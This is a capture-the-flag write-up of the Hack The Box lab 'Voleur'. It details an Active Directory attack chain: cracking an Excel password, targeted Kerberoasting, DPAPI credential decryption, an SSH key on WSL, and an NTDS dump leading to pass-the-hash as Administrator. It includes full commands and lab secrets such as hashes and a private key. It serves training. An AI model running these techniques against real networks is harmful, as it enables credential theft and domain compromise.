---
title: "Voleur"
excerpt: "HTB: Kerberos-only auth, a cracked Excel sheet leaking service account passwords, targeted Kerberoasting, a restored deleted user whose DPAPI credentials unlock the next account, and an NTDS backup reached through WSL."
date: 2026-10-08
tag: htb
draft: false
---

| | |
|---|---|
| **Target** | `10.129.232.130` |
| **Host** | `DC.voleur.htb` |
| **OS** | Windows (with WSL) |
| **Domain** | `voleur.htb` |
| **Given creds** | `ryan.naylor / HollowOct31Nyt` |
| **Chain** | Kerberos auth → crack `Access_Review.xlsx` on the `IT` share → `svc_ldap` creds → targeted Kerberoast → `svc_winrm` → restore deleted `Todd.Wolfe` → DPAPI credential for `jeremy.combs` → SSH key for `svc_backup` on WSL → `ntds.dit` backup → secretsdump → Administrator |

> Note:
> Remember, I am showing here only the final good path on how to do this box, dont be discouraged if your's doesnt look like this, because mine didnt. There was a lot of googling, searching, learning and taking wrong turns in between.

## Recon

nmap:

```text
> nmap -sV -sC voleur.htb    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 04:58 -0400
Nmap scan report for voleur.htb (10.129.232.130)
Host is up (0.037s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-07 16:58:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-10-07T16:58:37
|_  start_date: N/A
|_clock-skew: 7h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.52 seconds
```

### Kerberos authentication

Fix clock skew:

```bash
sudo ntpdate -u voleur.htb
```

We try to log in using the given credentials, but we are met with the error `STATUS_NOT_SUPPORTED` and we see that NTLM is turned off: `(NTLM:False)`.

```text
> nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt'   
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.232.130  445    DC               [-] voleur.htb\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED 
```

So we try to log in using Kerberos and it does work.

```bash
impacket-getTGT voleur.htb/ryan.naylor:'HollowOct31Nyt'
export KRB5CCNAME=ryan.naylor.ccache
```

```text
> nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
```

### Shares

Now let's list shares.

```text
> nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share 
```

## Exploitation

### Cracking Access_Review.xlsx

To inspect them interactively use `impacket-smbclient`. I searched the `IT` share, and there was an `Access_Review.xlsx` file protected by a password.

```bash
impacket-smbclient -k -no-pass voleur.htb/ryan.naylor@dc.voleur.htb
```

```text
# ls
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
```

![Access_Review.xlsx password prompt](/images/voleur/1.webp)

So let's try to crack it.

```bash
office2john Access_Review.xlsx > hash.txt
```

```text
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:02 DONE (2026-10-07 10:09) 0.3521g/s 281.6p/s 281.6c/s 281.6C/s football1..martha
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We get the password `football1`.

After opening that file we see:

![Access_Review.xlsx contents](/images/voleur/2.webp)

Here we spot that `Todd.Wolfe`'s password was reset to `NightT1meP1dg3on14` and his account was deleted. We also get credentials for `svc_ldap` and `svc_iis`.

`Todd.Wolfe` : `NightT1meP1dg3on14`

`svc_ldap` : `M1XyC9pW7qT5Vn`

`svc_iis` : `N5pXyW1VqM7CZ8`

### BloodHound

So let's get BloodHound data and look at the charts.

```bash
bloodhound-python -d voleur.htb -u ryan.naylor -k -no-pass \
  -ns 10.129.232.130 \
  -dc dc.voleur.htb -c all --zip
```

Here we see that we have `GenericWrite` over `Lacey.Miller`, so we can do a targeted Kerberoast.

![svc_ldap outbound edges in BloodHound](/images/voleur/3.webp)

### Restoring Todd.Wolfe

```bash
impacket-getTGT voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn'
```

```bash
export KRB5CCNAME=svc_ldap.ccache
```

```bash
bloodyAD -k --host dc.voleur.htb -d voleur.htb set restore 'Todd.Wolfe'
```

```bash
impacket-getTGT voleur.htb/Todd.Wolfe:'NightT1meP1dg3on14'
```

```bash
export KRB5CCNAME=Todd.Wolfe.ccache
```

```bash
bloodhound-python -d voleur.htb -u todd.wolfe -k -no-pass \
  -ns 10.129.232.130 \
  -dc dc.voleur.htb -c all --zip
```

### Targeted Kerberoast

```text
> python3 Tools/targetedKerberoast.py -d voleur.htb --dc-host dc.voleur.htb -u svc_ldap@voleur.htb -k
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$a5f0d1f8c9681a943119ce02bb4d6d1e$0c71f01d56fd40fa652824cf51312aa24ac83ccbbd810d7f94271496121d20c322cf662ebf7d4e3f6165992aed37f7a7712cd0d780a17350cd7b9345d30e8c8c034929760f4e9ba519b70378ca6242ea5871c2e4555fef571b59b688281460db4adf16c8380370948c3233806e16d44d50f451ffd7c5408096df0d5ad17029a1e5da2bc8156cef0b4ee9f9c212d4345a285930ac6c98a7ce1dc85ea99ae951d0224a5a7827e09073c0dba6c94224dc3fbb5c2a8f4279ccb36a547266982fd481359b540906e23f788455d5b26b6db2f8a96ced985d72c301ee16acc497373bcd71424b5d658a9fa1579d34ba4123fdd3535f9169cf36b86f8f3dd7f2a3c3e9764431c47b8322d5d6d74b0237cef8e3f8fad66feeb1a1784376aa18f426f636700d6382e2030dd96654db84cb00a778f2df855df5c4aa5aabcebd342ff8b587bf578a18f142f6ab70c19478649f7e05d803db488fb631ad88285061df7f04109cba57245f8f003f0ba3dc1b3cad2b4a1d0be6a924f8c6d30176edcad28a327424ed006de1aa15287651f5b63e830ef785e338b0b51bf5d989fb848f4e62658a88d146415f0d9c04c36e07eff41b6a1bdd55e45fab48b47b99c61faf3230fb94583824bc15d8e27ce694e0b7847d7ffe4e2c6a058bfc60e76fe5759ea790bf0f8604d027edd08fc986f2351cbfee1d4d82880473e9267b63cb45f813ff5efec13de98006443556d07ddb1f8dc8272811355c4fbeed87a7e43546f302cb7a37abb99615fda2aaf35f9474302c73cec167819cd5d5e4d73d7ebe5f36668bc0fa7dcc86ca9c294d5cc55da0b86fbf052cac7a9f8f7854bf5d4fcf94596a2722514dff3436b55eb714e713168f90847a981413c88efaba7eed561f12704eb99b110380e77d55c09df7e7ccaf8d3ba69c045df092c34af7774ba0b0d395f8266d13d9ea5e750e9816f3a6e29f64fc260c560d41791fcd88f925ab535531f302623e12d5f34cd0bc3da4be916f9449932469e50a0d0217a1cb727d2746877b60dc72a8188174ba81143f9ad6841286ff22ccc0707e72a68a9cf1f382afd554b09dcc86f6d756f7cee754d14fdd6ca05f6c6aaca58ad3ce471e8f4d274b41748347207e6a2c39ac551af49c29fc66fd138a185babc2136c129bb6bf5333b54693621bd020495d71c53107b2960daabfd65a13e01682541bb54864aff96e3f4b91ad0b94a7196095b3740a0e65be6873633aced7eb07dfff95e06d6334f93e3e2f5ebe30a0345d1c4ff38d5b88863a27252d5d634285a25d1ff2215febf1f5b3ec8ead0f823c338e78e109135f39189e62cf37eb0a1e65cc0b7e4cd80954e67594ae1077d6d2430123a8849c82c22996a484d253a591ff6ddbcb81a37d3e5d4fa1e2cc0f4f93d5a57e037e89171156fa0987a0f701677dbe4279a182724a9d0ca31498b96ec5bd1115bdf063863052d2bcb556577c1c5c2b
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$286a8557baa15e3cc7a90676aefe294a$81d3bab5f4e9f420b426adc5af5652ab1590a217c3275e71df118541020b7f73b02a5227fe5633d50fb2ebf289bb66cf5efa446f4283923b93abf3c20f148855d234ea85304edd74944f77e05ef950c18c877ca59744c22d03b74ac392f63041f8a82280a6f41cef13267d775a74d7e0891583b7fead78abc2aa728815c2e4a6bb5f9d0d2f5dfa9c582be97079caf778436d08e1ed5ec0bc63eb9918ec29c5e627749bf130aaf243eb8c99c22edd7e162b3b3a03140444c5122ba5605d12a64e02d78e7f58e9f4ede3f97191f4bbf11b060d5693502f7aa5c8b8c9228b38ab0453f450812400a4c7b344dc4bd8fe637206df64f56c7465eb1b1c29d0455a3ad2877b240754abb569824eda7d85c2b633f68161e8520dba68d8488f73a80b33767f9ba15351885df5e0bb5bbd2620db76861616872ab3aa05232a38ad56095bc4824c65c26dc5a1d0f066f61793acff10fb83f5e91f0305b05812f7c2da7b2bcba23310f49d00203f83f1a178b6e96120ba8aef4c7db4345bf691e30bcf06198a0ef7b65ea05719ed27de4de08600f06f77b9444784726a515a242fe6e7b396fea8cc80e47d149efdd12cbab76802c027c74d2d2a1262d7678d3f5e1a7a85b0315989692cc41cb12f7db2ea727f1c468a9b1f9c8ab788cb165c4eebc79e90fdd30bce550b6e37a8000e8e6a8ddb27c884f479cd12496ed9d76eded58e2dbf31deb6b592f64cd282f63ebe9883e4885256819a5cceca36869815637889db4b5b4c69ba35a801843653792820967bd70ee52baf45f77630d49a2f05cc730452b7f039699bd05bd4543422fca9bf8b138f8ffc49f9f854b8e87936c2164db9aa75626758dad4206aa01b0bbc0fc29dc54f1d2b60e521c3d1b439e2fb2f9163b406fd11fe3456a0e03ae2509a494e0f48acd0311b18dd05e50b835b2edd99470a9def2bf603af4191631ff98b23a6b2b585aa770d58dc91a3c425c46893fb4d0850e3adf040a3efbf2b9df20ecb471d7603e248ec9ab936e9853d54f74c1062d686086ff4b42233d3a75449dd2c695b4894d23a5a76e13047d0a92a468f36cc477ec45bc68703faecf0a6658952ad36ad5921be8f279db54392264da904e040e9f28ae22842d68b2677c1ee7140281e72acc3c8b2b1facf7809486862a25695b48696e26281e82e8c3314f710670b9a1b2e9fc66d0e28591be2ef2ceaed9ef59b3075c4921b39714c43a8fc47808de1bad3ccb7c69e60db67ff692f8696bab33a096b40c375a07aa383dc52d893d7ea386d10d44e7a84e2bb632980c2408634efb630ed26b4bc61dde7b3d586d9d228f20fa7329e7214e91e079aaf16bb47f039d9373f8a9e91514d234186820cc9020bb7cc85f6f3b0b4d8aa9f398e04d46cf4f2cacea3b7289c604b56888ea9580fc6204f40864a3f5f34baef5200641cc231bd7bcfb3cd64907a04e81a5b425b5fc85ba49f403e
```

```text
john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
AFireInsidedeOzarctica980219afi (?)     
1g 0:00:00:08 DONE (2026-10-07 19:48) 0.1215g/s 1742Kp/s 3136Kc/s 3136KC/s !!12Honey..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

We get the password for `svc_winrm`.

`svc_winrm` : `AFireInsidedeOzarctica980219afi`

### Shell as svc_winrm

So now:

```bash
impacket-getTGT voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi'
```

```bash
export KRB5CCNAME=svc_winrm.ccache 
```

```bash
evil-winrm -i dc.voleur.htb -u svc_winrm -r VOLEUR.HTB
```

```text
*Evil-WinRM* PS C:\Users\svc_winrm\Desktop> type user.txt
ed60817c9d812c149c222886bb1242c3
```

`user.txt` : `ed60817c9d812c149c222886bb1242c3`

## Privilege Escalation

This is the graph of users we currently have, and what they can do.

![Owned users in BloodHound](/images/voleur/4.webp)

From what we can see there aren't any possible pivots anymore, so we will start checking each one of these accounts. We will start with the highest privileged one, which is `Todd.Wolfe`, who is in the `Second-Line Technicians` group.

### Todd.Wolfe's archived profile

(some auto script removed `Todd.Wolfe` again, so I had to bring him back again)

```bash
impacket-getTGT voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn'
```

```bash
export KRB5CCNAME=svc_ldap.ccache
```

```bash
bloodyAD -k --host dc.voleur.htb -d voleur.htb set restore 'Todd.Wolfe'
```

```bash
impacket-getTGT voleur.htb/todd.wolfe:'NightT1meP1dg3on14'
```

```bash
export KRB5CCNAME=todd.wolfe.ccache
```

```bash
impacket-smbclient -k -no-pass voleur.htb/todd.wolfe@dc.voleur.htb
```

After typing:

```bash
tree
```

I found a couple of interesting files, one of them was:

```text
<SNIP>
/Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
<SNIP>
```

Which contained:

```text
> cat ConsoleHost_history.txt         
cd appdata
ls
cd local
ls
cd .\Microsoft\
ls
cd .\Credentials\
ls
cd ../../../
cd roaming
ls
cd .\Microsoft\
ls
cd .\Protect\
lw
ls
cd .\S-1-5-21-3927696377-1337352550-2781715495-1110\
ls
ls -h
ipconfig
ls -h
```

So I went to this path:

```bash
cd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110
```

```text
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 08:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 07:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 07:53:08 2025 Preferred
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# get BK-VOLEUR
# get Preferred
```

### DPAPI

This leads us to DPAPI abuse, so let's get the password too.

```bash
cd /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials
```

```text
# ls
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 10:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 08:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
```

Now get the masterkey.

```text
> impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

Using this key, decrypt the password.

```text
> impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83                                    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

And we get creds:

`jeremy.combs` : `qT3V9pLXyN7W4m`

### Jeremy.Combs -> svc_backup

```bash
impacket-getTGT voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m'
```

```bash
export KRB5CCNAME=jeremy.combs.ccache
```

```bash
impacket-smbclient -k -no-pass voleur.htb/jeremy.combs@dc.voleur.htb
```

In the `IT` share we go to `/Third-Line Support` and we see these:

```text
# ls
drw-rw-rw-          0  Thu Jan 30 11:11:29 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-       2602  Thu Jan 30 11:11:29 2025 id_rsa
-rw-rw-rw-        186  Thu Jan 30 11:07:35 2025 Note.txt.txt
# cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We get a private key, and they mentioned Windows backups too, so let's check if we can log in with it:

```bash
chmod 600 id_rsa
```

```bash
ssh svc_backup@voleur.htb -p2222 -i id_rsa
```

### NTDS backup on WSL

And since the note mentioned that it is WSL, let's go to the `/mnt/c` path.

```bash
cd /mnt/c
```

After a bit of searching, we find gold.

```text
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls *
'Active Directory':
ntds.dit  ntds.jfm

registry:
SECURITY  SYSTEM
```

So now download it.

```bash
scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SECURITY" .
```

```bash
scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
```

```bash
scp -i id_rsa -P 2222 "svc_backup@voleur.htb:/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
```

And dump secrets.

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

```text
> impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM 
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
<SNIP>
```

### root.txt

Get and use the `administrator` ticket.

```bash
impacket-getTGT voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2
```

```bash
export KRB5CCNAME=administrator.ccache
```

With the `administrator` ticket we can log in using `evil-winrm`.

```bash
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f771a099f264194d2cd96793db09ff7d
```

`root.txt` : `f771a099f264194d2cd96793db09ff7d`

GG.
